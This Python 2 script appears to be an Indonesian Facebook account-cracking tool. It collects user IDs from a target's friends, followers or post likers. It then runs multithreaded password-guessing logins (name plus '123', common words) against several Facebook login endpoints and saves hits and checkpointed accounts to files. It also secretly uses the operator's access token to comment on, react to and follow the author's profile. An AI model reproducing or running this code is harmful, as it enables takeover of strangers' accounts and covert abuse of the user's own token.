#!/usr/bin/python
# -*- coding: utf-8
#recode ? izin dulu su
#fb.me/nihal.kdr10
#tinggal pake ngapain recode, nnti error
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
	import requests
except ImportError:
        os.system("pip2 install requests")
        exit(" [+] Silakan Ketik : python2 run.py")

reload(sys)
sys.setdefaultencoding('utf8')
uafb = '[FB_IAB/FB4A;FBAV/35.0.0.48.273;]', '[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
useragents = 'Mozilla/5.0(Linux;U;Android 5.1.1;zh-CN;OPPO A33 Build/LMY47V) AppleWebKit/537.36(KHTML,like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.7.0.953 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua = random.choice(uafb)

### LOGO
logo = """\033[0;97m    _____                 _____ _____________________
   /  _  \               /     \\______   \_   _____/
  /  /_\  \    ______   /  \ /  \|    |  _/|    __)  
 /    |    \  /_____/  /    Y    \    |   \|     \   
 \____|__  /           \____|__  /______  /\___  /   
         \/                    \/       \/     \/    
 [*] Jika Ingin Cek Result Ketik : python2 run.py result\n
 [#] Author    : Farshad Ali
 [#] GitHub    : https://github.com/***
 [#] ------------------------------------------------
 [#] Instagram : @farshad__ali__
 [#] Facebook  : https://www.facebook.com/nihal.kdr10
### first fb hack with farshad -_

id = []
cp = []
ok = []

### DATETIME
ct = datetime.now()
n = ct.month
bulan = [
    'Januari',
    'Februari',
    'Maret',
    'April',
    'Mei',
    'Juni',
    'Juli',
    'Agustus',
    'September',
    'Oktober',
    'Nopember',
    'Desember']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### DURASI LICENSE BRO
durasi = str(datetime.now().strftime('%d-%m-%Y'))
license = requests.get("https://raw.githubusercontent.com/avsid/ambf/main/license.php").text
dev_angga = requests.get("https://raw.githubusercontent.com/avsid/ambf/main/durasi.php").text
response = " \033[0;97m[\033[0;93m!\033[0;97m] Mohon Tunggu Sebentar Lagi Update Script."
year_to_expire = int(dev_angga) ## angga kurniawan
try:
	assert int(durasi.split('-')[-1]) == year_to_expire, response
except AssertionError as e:
	os.system("clear")
	print logo
	print " [#] ------------------------------------------------"
	print " [#] Expired   : "+durasi
	print " [#] License   : "+license
	exit(response)

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')
    una = '100015073506062'
    post = '1031861840659590'
    post2 = '1110619372783836'
    kom = 'GW PAKE SC LU BANG ðŸ˜˜\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl'
    kom2 = 'KEREN BANG ðŸ˜˜\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl'
    reac = 'LOVE'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/638124327/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
    menu()
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		token = raw_input("\n [+] Your Token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (' [â€¢] Token Benar') 
			raw_input (' [>] Tekan Enter Ke Menu')
			bot_komen()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ('  [!] internet problem')
		sys.exit()
	print logo
	print "\n [ Selamat Datang \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] public id hack"
	print " [2] da id followers hack"
	print " [3] post bandi da likes wala hack"
	print " [0] Logout"
	pilih_menu()

def pilih_menu():
	ask = raw_input("\n [?] Choose >> ")
	if ask == "":
		print " [!] Pilih Yang Bener !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "4" or ask == "04":
		print "\n [*] Masukan ID Postingan Group"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?fields?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Berhasil Menghapus Token"
		exit()
	else:
		print " [!] Pilih Yang Bener !"
		exit()
	print " [*] Total ID : "+str(len(id))
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
		
	def main(arg):
		global ok,cp,ua
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : uid, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : ua})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				if 'checkpoint' in xo:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
					cp.append(uid+' | '+pass1)
					save = open('out/cp.txt','a')
					save.write(' '+str(uid)+' | '+str(pass1)+'\n')
					save.close()
				else:
					pass2 = name.lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : uid, "pass" : pass2, "login" : "submit"}, headers = { "user-agent" : ua})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
						ok.append(uid+' | '+pass2)
						save = open('out/ok.txt','a')
						save.write(' '+str(uid)+' | '+str(pass2)+'\n')
						save.close()
					else:
						if 'checkpoint' in xo:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
							cp.append(uid+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(' '+str(uid)+' | '+str(pass2)+'\n')
							save.close()
						else:
							pass3 = "sayang"
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : uid, "pass" : pass3, "login" : "submit"}, headers = { "user-agent" : ua})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' +pass3 
								ok.append(uid+' | '+pass3)
								save = open('out/ok.txt','a') 
								save.write(' '+str(uid)+' | '+str(pass3)+'\n')
								save.close()
							else:
								if 'checkpoint' in xo:
									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
									cp.append(uid+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(' '+str(uid)+' | '+str(pass3)+'\n')
									save.close() 
								else:
									pass4 = 'bangsat'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : ua})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4 
										ok.append(uid+' | '+pass4)
										save = open('out/ok.txt','a')
										save.write(' '+str(uid)+' | '+str(pass4)+'\n')
										save.close()
									else:
										if 'checkpoint' in xo:
											print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4 
											cp.append(uid+' | '+pass4)
											save = open('out/cp.txt','a')
											save.write(' '+str(uid)+' | '+str(pass4)+'\n')
											save.close()
										else:
											pass5 = 'anjing'
											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass5, "login" : "submit"}, headers = {"user-agent" : ua})
											xo = rex.content
											if 'mbasic_logout_button' in xo or 'save-device' in xo:
												print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
												ok.append(uid+' | '+pass5)
												save = open('out/ok.txt','a')
												save.write(' '+str(uid)+' | '+str(pass5)+'\n')
												save.close()
											else:
												if 'checkpoint' in xo:
													print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(' '+str(uid)+' | '+str(pass5)+'\n')
													save.close()
							
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()

### MENU TOUCH
def menutouch():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
		#ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
	print logo
	print "\n [ Selamat Datang \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] Crack Dari Publik Teman"
	print " [2] Crack Dari Total Followers"
	print " [3] Crack Dari Like Postingan"
	print " [0] Logout"
	pilih_menutouch()

def pilih_menutouch():
	ask = raw_input("\n [?] Choose >> ")
	if ask == "":
		print " [!] Pilih Yang Bener !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan Nya Ajah"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Berhasil Menghapus Token"
		exit()
	else:
		print " [!] Pilih Yang Bener !"
		exit()
	print " [*] Total ID : "+str(len(id))
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
		
	def main(arg):
		global ok,cp,ua
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': ua})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a') 
				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
				save.close()
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
				cp.append(uid+' | '+pass1)
				save = open('out/cp.txt','a') 
				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				pass2 = name.lower()+'12345'
				rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.url
				if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
					print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
					ok.append(uid+' | '+pass2)
					save = open('out/ok.txt','a') 
					save.write(' '+str(uid)+' | '+str(pass2)+'\n')
					save.close()
				elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
					cp.append(uid+' | '+pass2)
					save = open('out/cp.txt','a') 
					save.write(' '+str(uid)+' | '+str(pass2)+'\n')
					save.close()
				else:
					pass3 = 'sayang'
					rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': ua})
					xo = rex.url
					if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass3
						ok.append(uid+' | '+pass3)
						save = open('out/ok.txt','a') 
						save.write(' '+str(uid)+' | '+str(pass3)+'\n')
						save.close()
					elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
						print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
						cp.append(uid+' | '+pass3)
						save = open('out/cp.txt','a') 
						save.write(' '+str(uid)+' | '+str(pass3)+'\n')
						save.close()
					else:
						pass4 = 'anjing'
						rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': ua})
						xo = rex.url
						if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
							print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4
							ok.append(uid+' | '+pass4)
							save = open('out/ok.txt','a') 
							save.write(' '+str(uid)+' | '+str(pass4)+'\n')
							save.close()
						elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4
							cp.append(uid+' | '+pass4)
							save = open('out/cp.txt','a') 
							save.write(' '+(uid)+' | '+str(pass4)+'\n')
							save.close()
						else:
							pass5 = 'bangsat'
							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': ua})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(' '+(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(' '+str(uid)+' | '+str(pass5)+'\n')
								save.close()
				
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()

### MENU FREE
def menufree():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		time.sleep(3)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
	print logo
	print "\n [ Selamat Datang \033[0;93m"+nama+"\033[0;97m ]\n"
	print " [1] Crack Dari Publik Teman"
	print " [2] Crack Dari Total Followers"
	print " [3] Crack Dari Like Postingan"
	print " [0] Logout"
	pilih_menufree()

def pilih_menufree():
	ask = raw_input("\n [?] Choose >> ")
	if ask == "":
		print " [!] Pilih Yang Bener !"
		exit()
	elif ask == "1" or ask == "01":
		print "\n [*] Isi 'me' Jika Ingin Crack Dari List Teman"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print "\n [*] Isi 'me' Jika Ingin Crack Follower Sendiri"
		idt = raw_input(" [+] ID Publik : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print " [+] Nama : "+sp["name"]
		except KeyError:
			print " [!] ID Tidak Tersedia"
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		print "\n [*] Masukan ID Postingan Nya Ajah"
		idt = raw_input(" [+] ID Post : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print " [!] Berhasil Menghapus Token"
		exit()
	else:
		print " [!] Pilih Yang Bener !"
		exit()
	print " [*] Total ID : "+str(len(id))
	print " [+] File \033[0;92mOK\033[0;97m Tersimpan Di : out/ok.txt"
	print " [+] File \033[0;93mCP\033[0;97m Tersimpan Di : out/cp.txt"
	print " [!] Sedang Prosess Crack\n"
		
	def main(arg):
		global ok,cp,ua
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()+'123'
			rex = requests.post("https://free.facebook.com/login.php", data = {"email" : uid, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : ua})
			xo = rex.content
			if "save-device" in xo or "m_sess" in xo:
				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
				ok.append(uid+' | '+pass1)
				save = open('out/ok.txt','a')
				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
				save.close()
			else:
				if 'checkpoint' in xo:
					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
					cp.append(uid+' | '+pass1)
					save = open('out/cp.txt','a')
					save.write(' '+str(uid)+' | '+str(pass1)+'\n')
					save.close()
				else:
					pass2 = name.lower()+'12345'
					rex = requests.post("https://free.facebook.com/login.php", data = {"email" : uid, "pass" : pass2, "login" : "submit"}, headers = { "user-agent" : ua})
					xo = rex.content
					if "save-device" in xo or "m_sess" in xo:
						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
						ok.append(uid+' | '+pass2)
						save = open('out/ok.txt','a')
						save.write(' '+str(uid)+' | '+str(pass2)+'\n')
						save.close()
					else:
						if 'checkpoint' in xo:
							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
							cp.append(uid+' | '+pass2)
							save = open('out/cp.txt','a')
							save.write(' '+str(uid)+' | '+str(pass2)+'\n')
							save.close()
						else:
							pass3 = "sayang"
							rex = requests.post("https://free.facebook.com/login.php", data = {"email" : uid, "pass" : pass3, "login" : "submit"}, headers = { "user-agent" : ua})
							xo = rex.content
							if "save-device" in xo or "m_sess" in xo:
								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' +pass3
								ok.append(uid+' | '+pass3)
								save = open('out/ok.txt','a') 
								save.write(' '+str(uid)+' | '+str(pass3)+'\n')
								save.close()
							else:
								if 'checkpoint' in xo:
									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
									cp.append(uid+' | '+pass3)
									save = open('out/cp.txt','a')
									save.write(' '+str(uid)+' | '+str(pass3)+'\n')
									save.close() 
								else:
									pass4 = 'bangsat'
									rex = requests.post("https://free.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : ua})
									xo = rex.content
									if "save-device" in xo or "m_sess" in xo:
										print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4
										ok.append(uid+' | '+pass4)
										save = open('out/ok.txt','a')
										save.write(' '+str(uid)+' | '+str(pass4)+'\n')
										save.close()
									else:
										if 'checkpoint' in xo:
											print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4
											cp.append(uid+' | '+pass4)
											save = open('out/cp.txt','a')
											save.write(' '+str(uid)+' | '+str(pass4)+'\n')
											save.close()
										else:
											pass5 = 'anjing'
											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass5, "login" : "submit"}, headers = {"user-agent" : ua})
											xo = rex.content
											if "save-device" in xo or "m_sess" in xo:
												print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
												ok.append(uid+' | '+pass5)
												save = open('out/ok.txt','a')
												save.write(' '+str(uid)+' | '+str(pass5)+'\n')
												save.close()
											else:
												if 'checkpoint' in xo:
													print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
													cp.append(uid+' | '+pass5)
													save = open('out/cp.txt','a')
													save.write(' '+str(uid)+' | '+str(pass5)+'\n')
													save.close()
							
					
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()

def checkupdate():
	versi = requests.get('https://raw.githubusercontent.com/avsid/ambf/main/versi.txt').text
	url = "https://raw.githubusercontent.com/avsid/ambf/main/checkupdate.txt"
	dev_angga = requests.get(url).text
	if 'Not Update' in dev_angga:
		print " [#] Tidak Tersedia Update"
	elif 'Update' in dev_angga:
		os.system("clear")
		print logo
		ask = raw_input ("\n [+] Tersedia Update Versi : \033[0;93m"+versi+" \033[0;97m[Y/t] : ")
		if ask =="":
			print " [!] Pilih Yang Bener"
			exit()
		elif ask == "y" or ask =="Y":
			time.sleep(1)
			os.system("git clone")
		elif ask == "T" or ask =="t":
			print " [#] Silakan Update Script Dulu"
			exit()
		else:
			print " [!] Pilih Yang Bener"
			exit()
		
### coded by farshad
### hack with farshad
### https://www.facebook.com/nihal.kdr10
if __name__ == '__main__':
	if len(sys.argv) == 2:
		if sys.argv[1] == 'result':
			os.system("clear")
			print logo
			print "\n [+] Hasil Crack \033[0;93mCP\033[0;97m :\n"
			os.system('cat out/cp.txt')
			print "\n [+] Hasil Crack \033[0;92mOK\033[0;97m :\n"
			os.system('cat out/ok.txt')
			exit("\n [#] Silakan Di Copy Hasil Crack Nya")
		if sys.argv[1] == 'touch':
			os.system("git pull")
			if os.path.exists("login.txt"):
				pass
			else:open("login.txt","a+").close()
			menutouch()
		if sys.argv[1] == 'free':
			os.system("git pull")
			if os.path.exists("login.txt"):
				pass
			else:open("login.txt","a+").close()
			menufree()
		else:
			print " [!] Cara Menggunakan? "
			print " [*] Ketik : python2 run.py touch Untuk Method Crack Touch FB"
			exit(" [*] Ketik : python2 run.py result Untuk Cek Result")
	os.system("clear")
	print logo
	print " [#] Sebentar Lagi Update..."
	os.system("git pull")
	tokenz()
